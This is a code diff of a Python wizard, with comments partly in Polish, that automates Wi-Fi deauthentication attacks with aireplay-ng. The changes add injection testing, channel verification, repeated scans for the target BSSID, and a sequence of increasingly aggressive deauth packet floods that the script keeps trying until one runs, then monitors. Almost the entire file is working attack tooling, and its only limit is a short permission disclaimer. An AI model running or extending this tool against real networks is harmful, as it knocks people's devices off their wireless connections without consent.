@@ -6,6 +6,7 @@ import time
 import signal
 import subprocess
 import logging
+import select
 from typing import Dict, List, Optional
 
 logging.basicConfig(level=logging.INFO, format="%(message)s")
@@ -16,6 +17,7 @@ COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
 COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
 COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
 COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
+COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
 STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""
 
 # Global attack process variable
@@ -349,6 +351,34 @@ def cleanup() -> None:
     stop_attack()
 
 
+def verify_channel(interface: str, expected_channel: int) -> bool:
+    """Weryfikuje czy interfejs jest na poprawnym kanale"""
+    result = subprocess.run(
+        ["iw", "dev", interface, "info"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+    )
+    
+    if result.returncode != 0:
+        return False
+    
+    for line in result.stdout.splitlines():
+        line = line.strip()
+        if "channel" in line.lower():
+            if str(expected_channel) in line:
+                return True
+            # Sprawdź częstotliwość
+            if "freq" in line.lower():
+                try:
+                    freq = float(line.split()[1])
+                    from_freq = freq_to_channel(freq)
+                    return from_freq == expected_channel
+                except:
+                    pass
+    return False
+
+
 def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
     global ATTACK_PROCESS, ATTACK_RUNNING
     bssid = target["bssid"]
@@ -358,130 +388,224 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
         logging.error("Missing target BSSID; cannot start attack.")
         return False
 
-    # Testowanie interfejsu
-    logging.info("Testing interface %s...", interface)
+    # 1. TEST INJECTION
+    logging.info("\n" + "="*50)
+    logging.info(style("STEP 1: Testing packet injection", STYLE_BOLD))
+    logging.info("="*50)
+    
     test_result = subprocess.run(
         ["aireplay-ng", "--test", interface],
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         text=True,
+        timeout=10,
     )
     
-    if test_result.returncode == 0:
-        logging.info(color_text("✓ Interface test passed", COLOR_SUCCESS))
-        if "Injection is working!" in test_result.stdout:
-            logging.info(color_text("✓ Packet injection working", COLOR_SUCCESS))
+    if test_result.returncode != 0:
+        logging.error(color_text("✗ aireplay-ng test failed!", COLOR_ERROR))
+        logging.error("Error: %s", test_result.stderr[:200])
+        return False
+    
+    if "Injection is working!" not in test_result.stdout:
+        logging.warning(color_text("⚠ Packet injection may not work", COLOR_WARNING))
+        # Spróbujmy i tak
     else:
-        logging.warning("Interface test issues: %s", test_result.stderr[:100])
+        logging.info(color_text("✓ Packet injection working", COLOR_SUCCESS))
     
-    # Ustaw kanał jeśli znany
+    # 2. USTAW KANAŁ I WERYFIKUJ
     if channel:
-        logging.info("Setting channel %s on %s...", channel, interface)
-        channel_result = subprocess.run(
-            ["iw", "dev", interface, "set", "channel", str(channel)],
-            stderr=subprocess.PIPE,
-            text=True,
-        )
-        if channel_result.returncode != 0:
-            logging.warning("Could not set channel: %s", channel_result.stderr.strip())
+        logging.info("\n" + "="*50)
+        logging.info(style(f"STEP 2: Setting channel {channel}", STYLE_BOLD))
+        logging.info("="*50)
+        
+        # Zatrzymaj interfejs przed zmianą kanału
+        subprocess.run(["ip", "link", "set", interface, "down"], 
+                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        time.sleep(0.5)
+        
+        # Ustaw kanał
+        for attempt in range(3):
+            channel_result = subprocess.run(
+                ["iw", "dev", interface, "set", "channel", str(channel)],
+                stderr=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                text=True,
+            )
+            
+            if channel_result.returncode == 0:
+                logging.info(f"✓ Channel {channel} set (attempt {attempt+1})")
+                break
+            else:
+                logging.warning(f"Attempt {attempt+1} failed: {channel_result.stderr.strip()}")
+                time.sleep(1)
+        
+        # Włącz interfejs
+        subprocess.run(["ip", "link", "set", interface, "up"],
+                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        time.sleep(1)
+        
+        # WERYFIKUJ kanał
+        if verify_channel(interface, channel):
+            logging.info(color_text(f"✓ Verified: on channel {channel}", COLOR_SUCCESS))
+        else:
+            logging.error(color_text(f"✗ FAILED to set channel {channel}!", COLOR_ERROR))
+            logging.info("Trying to auto-detect channel...")
+            # Spróbuj bez konkretnego kanału
     
-    # SPRAWDŹ CZY WIDZISZ CELEWY BSSID
-    logging.info("\nChecking for target BSSID %s...", bssid)
-    scan_result = subprocess.run(
-        ["iw", "dev", interface, "scan"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True,
-    )
+    # 3. SPRAWDŹ CZY WIDZISZ CEL
+    logging.info("\n" + "="*50)
+    logging.info(style("STEP 3: Verifying target visibility", STYLE_BOLD))
+    logging.info("="*50)
     
     target_found = False
-    if scan_result.returncode == 0:
-        for line in scan_result.stdout.splitlines():
-            if bssid.lower() in line.lower():
-                target_found = True
-                break
+    for scan_attempt in range(3):
+        logging.info(f"Scan attempt {scan_attempt + 1}/3...")
+        scan_result = subprocess.run(
+            ["iw", "dev", interface, "scan", "duration", "2"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            timeout=5,
+        )
+        
+        if scan_result.returncode == 0:
+            for line in scan_result.stdout.splitlines():
+                if bssid.lower() in line.lower():
+                    target_found = True
+                    # Znajdź kanał w output
+                    if "freq:" in line or "channel" in line:
+                        logging.info(f"Target found: {line.strip()}")
+                    break
+        
+        if target_found:
+            logging.info(color_text(f"✓ Target {bssid} is visible", COLOR_SUCCESS))
+            break
+        else:
+            logging.warning(f"Target not found in scan {scan_attempt + 1}")
+            time.sleep(1)
     
     if not target_found:
-        logging.warning("⚠ Target BSSID not found in scan!")
-        logging.warning("Make sure you're on the correct channel and in range.")
-        proceed = input("Continue anyway? (y/n): ").strip().lower()
+        logging.error(color_text("✗ Target not visible!", COLOR_ERROR))
+        logging.info("Possible reasons:")
+        logging.info("  1. Wrong channel (router may have changed)")
+        logging.info("  2. Too far from target")
+        logging.info("  3. Interface not in monitor mode")
+        
+        # Sprawdź tryb interfejsu
+        if not is_monitor_mode(interface):
+            logging.error("Interface is NOT in monitor mode!")
+            if not set_interface_type(interface, "monitor"):
+                return False
+        
+        proceed = input("Try attack anyway? (y/n): ").strip().lower()
         if proceed != 'y':
             return False
     
-    # URUCHOM ATAK Z WIĘKSZĄ LICZBĄ PAKIETÓW
-    logging.info("\nStarting aggressive deauth attack on %s...", bssid)
+    # 4. URUCHOM ATAK - AGGRESYWNA WERSJA
+    logging.info("\n" + "="*50)
+    logging.info(style("STEP 4: Starting attack", STYLE_BOLD))
+    logging.info("="*50)
     
-    # Próbuj różne opcje aireplay-ng:
-    options_to_try = [
-        # Standard
-        ["aireplay-ng", "-0", "0", "-a", bssid, interface],
-        # Z większą szybkością
-        ["aireplay-ng", "-0", "1000", "-a", bssid, interface],
-        # Z określonym interwałem
-        ["aireplay-ng", "-0", "0", "-a", bssid, "-x", "100", interface],
+    # PRÓBUJ RÓŻNE METODY
+    methods = [
+        {
+            "name": "Continuous attack (standard)",
+            "cmd": ["aireplay-ng", "-0", "0", "-a", bssid, interface]
+        },
+        {
+            "name": "Fast attack (1000 packets)",
+            "cmd": ["aireplay-ng", "-0", "1000", "-a", bssid, interface]
+        },
+        {
+            "name": "Aggressive attack (500 packets, fast)",
+            "cmd": ["aireplay-ng", "-0", "500", "-a", bssid, "-x", "256", interface]
+        },
+        {
+            "name": "Very aggressive (200 packets, very fast)",
+            "cmd": ["aireplay-ng", "-0", "200", "-a", bssid, "-x", "512", interface]
+        }
     ]
     
-    for i, cmd in enumerate(options_to_try):
-        if i == 0:
-            # Pierwsza próba - standardowa
-            logging.info("Trying standard attack...")
-        else:
-            logging.info("Trying alternative method %d...", i)
+    for method_idx, method in enumerate(methods):
+        logging.info(f"\nTrying: {method['name']}")
+        
+        if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
             stop_attack()
-            time.sleep(1)
+            time.sleep(2)
         
         try:
+            # Uruchom aireplay-ng
             ATTACK_PROCESS = subprocess.Popen(
-                cmd,
+                method["cmd"],
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 text=True,
+                bufsize=1,
+                universal_newlines=True,
                 preexec_fn=os.setsid,
             )
             
-            # Czytaj output przez 5 sekund żeby zobaczyć co się dzieje
+            # Poczekaj na inicjalizację
+            time.sleep(3)
+            
+            # Sprawdź czy proces żyje
+            if ATTACK_PROCESS.poll() is not None:
+                stderr_output = ""
+                try:
+                    stderr_output = ATTACK_PROCESS.stderr.read()
+                except:
+                    pass
+                
+                logging.warning(f"Process exited: {stderr_output[:200]}")
+                continue
+            
+            # Przeczytaj początkowy output
             for _ in range(5):
+                ready, _, _ = select.select([ATTACK_PROCESS.stdout, ATTACK_PROCESS.stderr], [], [], 0.1)
+                
+                for stream in ready:
+                    try:
+                        line = stream.readline()
+                        if line:
+                            line = line.strip()
+                            if "sending" in line.lower() or "packet" in line.lower():
+                                logging.info(color_text(f"  → {line}", COLOR_HIGHLIGHT))
+                            elif "error" in line.lower() or "fail" in line.lower():
+                                logging.warning(f"  ⚠ {line}")
+                            else:
+                                logging.debug(f"  {line}")
+                    except:
+                        pass
+                
                 if ATTACK_PROCESS.poll() is not None:
                     break
-                    
-                # Sprawdź czy są jakieś komunikaty
-                try:
-                    # Użyj read1() zamiast read() dla PIPE
-                    if ATTACK_PROCESS.stdout:
-                        output = ATTACK_PROCESS.stdout.read1(1024).decode('utf-8', errors='ignore')
-                        if output:
-                            logging.info("aireplay-ng: %s", output.strip())
-                            
-                    if ATTACK_PROCESS.stderr:
-                        error = ATTACK_PROCESS.stderr.read1(1024).decode('utf-8', errors='ignore')
-                        if error:
-                            logging.warning("aireplay-ng error: %s", error.strip())
-                except:
-                    pass
-                    
-                time.sleep(1)
             
-            # Jeśli proces nadal działa, kontynuuj
+            # Jeśli proces nadal działa, uznaj za sukces
             if ATTACK_PROCESS.poll() is None:
-                logging.info(color_text("✓ Attack running (method %d)", COLOR_SUCCESS), i+1)
-                ATTACK_RUNNING = True
+                logging.info(color_text(f"✓ Attack running ({method['name']})", COLOR_SUCCESS))
+                logging.info(f"PID: {ATTACK_PROCESS.pid}")
                 
-                # Pobierz PID i wyświetl informację
+                # Pobierz statystyki
                 try:
-                    pid = ATTACK_PROCESS.pid
-                    logging.info("Attack PID: %d", pid)
+                    stats = subprocess.run(
+                        ["iw", interface, "station", "dump"],
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.DEVNULL,
+                        text=True,
+                    )
+                    if stats.returncode == 0:
+                        logging.debug("Interface stats available")
                 except:
                     pass
-                    
+                
+                ATTACK_RUNNING = True
                 return True
-            else:
-                exit_code = ATTACK_PROCESS.poll()
-                logging.warning("Attack stopped with code %d, trying next method...", exit_code)
                 
         except Exception as exc:
-            logging.error("Error with method %d: %s", i+1, exc)
+            logging.error(f"Error with {method['name']}: {exc}")
+            continue
     
-    logging.error("All attack methods failed!")
+    logging.error(color_text("✗ All attack methods failed!", COLOR_ERROR))
     return False
 
 
@@ -535,27 +659,40 @@ def monitor_attack() -> None:
     
     check_count = 0
     while ATTACK_RUNNING:
-        time.sleep(2)
+        time.sleep(3)
         check_count += 1
         
         if ATTACK_PROCESS is None:
             break
             
         if ATTACK_PROCESS.poll() is not None:
-            logging.error("\n%s Attack process terminated unexpectedly!", color_text("✗", COLOR_WARNING))
-            if ATTACK_PROCESS.stderr:
-                try:
-                    stderr_content = ATTACK_PROCESS.stderr.read().strip()
+            logging.error("\n%s Attack process terminated unexpectedly!", color_text("✗", COLOR_ERROR))
+            try:
+                if ATTACK_PROCESS.stderr:
+                    stderr_content = ATTACK_PROCESS.stderr.read()
                     if stderr_content:
-                        logging.error("Error output: %s", stderr_content)
-                except:
-                    pass
+                        logging.error("Error output: %s", stderr_content[:500])
+            except:
+                pass
             ATTACK_RUNNING = False
             break
         
-        # Co 30 sekund wyświetl informację że atak nadal trwa
-        if check_count % 15 == 0 and ATTACK_RUNNING:
-            logging.info("%s Attack still running...", color_text("→", COLOR_HIGHLIGHT))
+        # Co 30 sekund wyświetl informację
+        if check_count % 10 == 0 and ATTACK_RUNNING:
+            logging.info("%s Attack still running... %s", 
+                        color_text("→", COLOR_HIGHLIGHT),
+                        time.strftime("%H:%M:%S"))
+            
+            # Spróbuj pobrać jakieś dane z procesu
+            try:
+                if ATTACK_PROCESS.stdout:
+                    ready, _, _ = select.select([ATTACK_PROCESS.stdout], [], [], 0.1)
+                    if ready:
+                        line = ATTACK_PROCESS.stdout.readline()
+                        if line and ("sent" in line.lower() or "packet" in line.lower()):
+                            logging.info("  %s", line.strip())
+            except:
+                pass
 
 
 def run_deauth_session() -> bool:
@@ -568,7 +705,7 @@ def run_deauth_session() -> bool:
     input(f"{style('Press Enter', STYLE_BOLD)} to switch {SELECTED_INTERFACE} to monitor mode...")
     if not set_interface_type(SELECTED_INTERFACE, "monitor"):
         return False
-    logging.info("Monitor mode confirmed on %s.", SELECTED_INTERFACE)
+    logging.info(color_text("✓ Monitor mode confirmed", COLOR_SUCCESS))
 
     logging.info("")
     scan_seconds = prompt_int(
@@ -582,9 +719,10 @@ def run_deauth_session() -> bool:
     target_network = select_network(SELECTED_INTERFACE, scan_seconds)
     logging.info("")
     logging.info(
-        "Target selected: %s (%s)",
+        "Target selected: %s (%s) on channel %s",
         style(target_network["ssid"], COLOR_SUCCESS, STYLE_BOLD),
         target_network["bssid"],
+        style(str(target_network["channel"]), COLOR_HIGHLIGHT) if target_network["channel"] else "unknown"
     )
 
     if not is_monitor_mode(SELECTED_INTERFACE):
@@ -593,24 +731,32 @@ def run_deauth_session() -> bool:
             return False
 
     logging.info("")
-    logging.info(style("Starting deauthentication attack...", COLOR_WARNING, STYLE_BOLD))
+    logging.info(style("="*60, STYLE_BOLD))
+    logging.info(style("STARTING DEAUTHENTICATION ATTACK", COLOR_WARNING, STYLE_BOLD))
+    logging.info(style("="*60, STYLE_BOLD))
     
     if not start_deauth_attack(SELECTED_INTERFACE, target_network):
-        logging.error("Failed to start deauth attack.")
+        logging.error(color_text("Attack failed to start!", COLOR_ERROR))
         return False
     
     logging.info("")
-    logging.info("Deauth attack is now running continuously.")
-    logging.info("The attack will continue until you manually stop it.")
+    logging.info(style("ATTACK STATUS:", STYLE_BOLD))
+    logging.info("✓ Attack is running")
+    logging.info("✓ Sending deauth packets continuously")
+    logging.info("✓ Monitor active")
     logging.info("")
-    logging.info(style("Options:", STYLE_BOLD))
-    logging.info("  [S] - Stop attack and return to interface selection")
-    logging.info("  [B] - Stop attack and return to main menu")
-    logging.info("  [R] - Stop attack and restart from scanning")
+    logging.info(style("Note:", COLOR_WARNING))
+    logging.info("Some modern routers/devices may be resistant to deauth attacks.")
+    logging.info("If devices don't disconnect, they may have protection (WPA3/802.11w).")
+    logging.info("")
+    logging.info(style("CONTROLS:", STYLE_BOLD))
+    logging.info("  [S] - Stop and select new interface")
+    logging.info("  [B] - Stop and return to main menu")
+    logging.info("  [R] - Stop and scan for new target")
     logging.info("  [Ctrl+C] - Emergency stop")
     logging.info("")
     
-    # Uruchom wątek monitorujący atak w tle
+    # Uruchom wątek monitorujący
     import threading
     monitor_thread = threading.Thread(target=monitor_attack, daemon=True)
     monitor_thread.start()
@@ -627,17 +773,17 @@ def run_deauth_session() -> bool:
                     logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                     logging.info("Returning to interface selection...")
                     logging.info("")
-                    return True  # Restart
+                    return True
                 elif choice in {"b", "back"}:
                     stop_attack()
                     logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
-                    return False  # Back to main menu
+                    return False
                 elif choice in {"r", "restart"}:
                     stop_attack()
                     logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                     logging.info("Restarting from network scan...")
                     logging.info("")
-                    return True  # Restart
+                    return True
                 else:
                     logging.warning("Please enter S, B, or R.")
             except KeyboardInterrupt:
@@ -659,31 +805,37 @@ def run_deauth_session() -> bool:
 
 
 def main() -> None:
-    print_header("Deauth Wizard", "Wi-Fi Deauthentication Attack Tool")
+    print_header("DEAUTH WIZARD v2.0", "Advanced Wi-Fi Deauthentication Attack Tool")
+    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
+    logging.info("Use only on networks you own or have explicit permission to test!")
+    logging.info("")
 
     if os.geteuid() != 0:
         logging.error("This script must be run as root!")
         sys.exit(1)
 
     required_tools = ["iw", "ip", "ethtool", "aireplay-ng"]
+    missing_tools = []
     for tool in required_tools:
         if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
-            logging.error("Required tool '%s' not found!", tool)
-            sys.exit(1)
+            missing_tools.append(tool)
+    
+    if missing_tools:
+        logging.error("Missing required tools: %s", ", ".join(missing_tools))
+        logging.info("Install with: sudo apt install wireless-tools net-tools ethtool aircrack-ng")
+        sys.exit(1)
 
     import atexit
     atexit.register(cleanup)
 
     while True:
-        logging.info(style("Disclaimer:", STYLE_BOLD))
-        logging.info(
-            "Only test on networks and devices you own or have explicit permission to use."
-        )
-        logging.info("")
         restart = run_deauth_session()
         if not restart:
+            logging.info(color_text("Exiting Deauth Wizard.", COLOR_HEADER))
             break
-        logging.info(color_text("Restarting deauth wizard...\n", COLOR_HEADER))
+        logging.info(color_text("\n" + "="*60, COLOR_HEADER))
+        logging.info(color_text("RESTARTING DEAUTH WIZARD...", COLOR_HEADER, STYLE_BOLD))
+        logging.info(color_text("="*60 + "\n", COLOR_HEADER))
 
 
 if __name__ == "__main__":
